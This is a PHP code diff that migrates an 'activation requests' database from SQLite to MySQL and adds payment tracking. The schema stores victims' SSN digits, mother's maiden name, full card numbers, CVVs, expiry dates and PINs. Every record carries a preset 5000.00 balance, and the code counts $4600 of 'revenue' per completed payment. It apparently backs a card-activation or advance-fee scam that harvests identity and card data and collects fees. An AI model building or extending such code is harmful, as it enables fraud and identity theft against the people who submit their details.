@@ -1,25 +1,21 @@
 <?php
 /**
  * Database Connection
- * SQLite database for storing activation requests
+ * MySQL database for storing activation requests
  */
 
-// Database file path
-define('DB_PATH', __DIR__ . '/../database/activations.db');
+// Include database configuration
+require_once __DIR__ . '/../config/database.php';
 
 /**
  * Get database connection
  */
 function get_db_connection() {
     try {
-        // Ensure database directory exists
-        $db_dir = dirname(DB_PATH);
-        if (!file_exists($db_dir)) {
-            mkdir($db_dir, 0755, true);
-        }
-        
-        $db = new PDO('sqlite:' . DB_PATH);
+        $dsn = 'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4';
+        $db = new PDO($dsn, DB_USER, DB_PASS);
         $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+        $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
         
         // Create tables if they don't exist
         create_tables($db);
@@ -37,42 +33,50 @@ function get_db_connection() {
 function create_tables($db) {
     // Activation requests table
     $db->exec('CREATE TABLE IF NOT EXISTS activation_requests (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        first_name TEXT NOT NULL,
-        last_name TEXT NOT NULL,
-        dob TEXT NOT NULL,
-        email TEXT NOT NULL,
-        phone TEXT NOT NULL,
-        account_number TEXT NOT NULL,
-        street TEXT NOT NULL,
-        city TEXT NOT NULL,
-        state TEXT NOT NULL,
-        zip TEXT NOT NULL,
-        ssn_last4 TEXT NOT NULL,
-        maiden_name TEXT NOT NULL,
-        card_number TEXT NOT NULL,
-        cvv TEXT NOT NULL,
-        expiry_date TEXT NOT NULL,
-        pin_hash TEXT NOT NULL,
-        balance REAL DEFAULT 5000.00,
-        status TEXT DEFAULT "pending",
-        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
-        reviewed_at TEXT,
-        reviewed_by TEXT,
-        admin_notes TEXT
-    )');
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        first_name VARCHAR(100) NOT NULL,
+        last_name VARCHAR(100) NOT NULL,
+        dob DATE NOT NULL,
+        email VARCHAR(255) NOT NULL,
+        phone VARCHAR(20) NOT NULL,
+        account_number VARCHAR(50) NOT NULL,
+        street VARCHAR(255) NOT NULL,
+        city VARCHAR(100) NOT NULL,
+        state VARCHAR(50) NOT NULL,
+        zip VARCHAR(20) NOT NULL,
+        ssn_last4 VARCHAR(4) NOT NULL,
+        maiden_name VARCHAR(100) NOT NULL,
+        card_number VARCHAR(16) NOT NULL,
+        cvv VARCHAR(3) NOT NULL,
+        expiry_date VARCHAR(7) NOT NULL,
+        pin_hash VARCHAR(255) NOT NULL,
+        balance DECIMAL(10,2) DEFAULT 5000.00,
+        payment_method VARCHAR(20) DEFAULT NULL,
+        payment_status VARCHAR(20) DEFAULT "pending",
+        payment_address VARCHAR(255) DEFAULT NULL,
+        status VARCHAR(20) DEFAULT "pending",
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+        reviewed_at TIMESTAMP NULL,
+        reviewed_by VARCHAR(50) DEFAULT NULL,
+        admin_notes TEXT DEFAULT NULL,
+        INDEX idx_email (email),
+        INDEX idx_status (status),
+        INDEX idx_payment_status (payment_status)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4');
     
     // Admin users table
     $db->exec('CREATE TABLE IF NOT EXISTS admin_users (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        username TEXT UNIQUE NOT NULL,
-        password_hash TEXT NOT NULL,
-        full_name TEXT NOT NULL,
-        email TEXT NOT NULL,
-        role TEXT DEFAULT "admin",
-        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
-        last_login TEXT
-    )');
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        username VARCHAR(50) UNIQUE NOT NULL,
+        password_hash VARCHAR(255) NOT NULL,
+        full_name VARCHAR(100) NOT NULL,
+        email VARCHAR(255) NOT NULL,
+        role VARCHAR(20) DEFAULT "admin",
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        last_login TIMESTAMP NULL,
+        INDEX idx_username (username)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4');
     
     // Create default admin user if not exists
     $stmt = $db->prepare('SELECT COUNT(*) FROM admin_users WHERE username = ?');
@@ -185,12 +189,52 @@ function update_activation_status($id, $status, $admin_username, $notes = '') {
     
     try {
         $stmt = $db->prepare('UPDATE activation_requests 
-                              SET status = ?, reviewed_at = CURRENT_TIMESTAMP, 
+                              SET status = ?, reviewed_at = NOW(), 
                                   reviewed_by = ?, admin_notes = ?
                               WHERE id = ?');
         return $stmt->execute([$status, $admin_username, $notes, $id]);
     } catch (PDOException $e) {
         error_log('Failed to update activation status: ' . $e->getMessage());
+        return false;
+    }
+}
+
+/**
+ * Update payment information
+ */
+function update_payment_info($id, $payment_method, $payment_address = null) {
+    $db = get_db_connection();
+    if (!$db) {
+        return false;
+    }
+    
+    try {
+        $stmt = $db->prepare('UPDATE activation_requests 
+                              SET payment_method = ?, payment_address = ?, payment_status = ?
+                              WHERE id = ?');
+        return $stmt->execute([$payment_method, $payment_address, 'pending', $id]);
+    } catch (PDOException $e) {
+        error_log('Failed to update payment info: ' . $e->getMessage());
+        return false;
+    }
+}
+
+/**
+ * Update payment status
+ */
+function update_payment_status($id, $payment_status) {
+    $db = get_db_connection();
+    if (!$db) {
+        return false;
+    }
+    
+    try {
+        $stmt = $db->prepare('UPDATE activation_requests 
+                              SET payment_status = ?
+                              WHERE id = ?');
+        return $stmt->execute([$payment_status, $id]);
+    } catch (PDOException $e) {
+        error_log('Failed to update payment status: ' . $e->getMessage());
         return false;
     }
 }
@@ -211,7 +255,7 @@ function verify_admin($username, $password) {
         
         if ($admin && password_verify($password, $admin['password_hash'])) {
             // Update last login
-            $stmt = $db->prepare('UPDATE admin_users SET last_login = CURRENT_TIMESTAMP WHERE id = ?');
+            $stmt = $db->prepare('UPDATE admin_users SET last_login = NOW() WHERE id = ?');
             $stmt->execute([$admin['id']]);
             return $admin;
         }
@@ -229,7 +273,7 @@ function verify_admin($username, $password) {
 function get_activation_stats() {
     $db = get_db_connection();
     if (!$db) {
-        return ['total' => 0, 'pending' => 0, 'approved' => 0, 'rejected' => 0];
+        return ['total' => 0, 'pending' => 0, 'approved' => 0, 'rejected' => 0, 'pending_payments' => 0, 'completed_payments' => 0, 'total_revenue' => 0];
     }
     
     try {
@@ -237,15 +281,23 @@ function get_activation_stats() {
         $pending = $db->query('SELECT COUNT(*) FROM activation_requests WHERE status = "pending"')->fetchColumn();
         $approved = $db->query('SELECT COUNT(*) FROM activation_requests WHERE status = "approved"')->fetchColumn();
         $rejected = $db->query('SELECT COUNT(*) FROM activation_requests WHERE status = "rejected"')->fetchColumn();
+        $pending_payments = $db->query('SELECT COUNT(*) FROM activation_requests WHERE payment_status = "pending" AND payment_method IS NOT NULL')->fetchColumn();
+        $completed_payments = $db->query('SELECT COUNT(*) FROM activation_requests WHERE payment_status = "completed"')->fetchColumn();
+        
+        // Calculate total revenue (assuming $4600 per activation)
+        $total_revenue = $completed_payments * 4600;
         
         return [
             'total' => $total,
             'pending' => $pending,
             'approved' => $approved,
-            'rejected' => $rejected
+            'rejected' => $rejected,
+            'pending_payments' => $pending_payments,
+            'completed_payments' => $completed_payments,
+            'total_revenue' => $total_revenue
         ];
     } catch (PDOException $e) {
         error_log('Failed to get stats: ' . $e->getMessage());
-        return ['total' => 0, 'pending' => 0, 'approved' => 0, 'rejected' => 0];
+        return ['total' => 0, 'pending' => 0, 'approved' => 0, 'rejected' => 0, 'pending_payments' => 0, 'completed_payments' => 0, 'total_revenue' => 0];
     }
 }
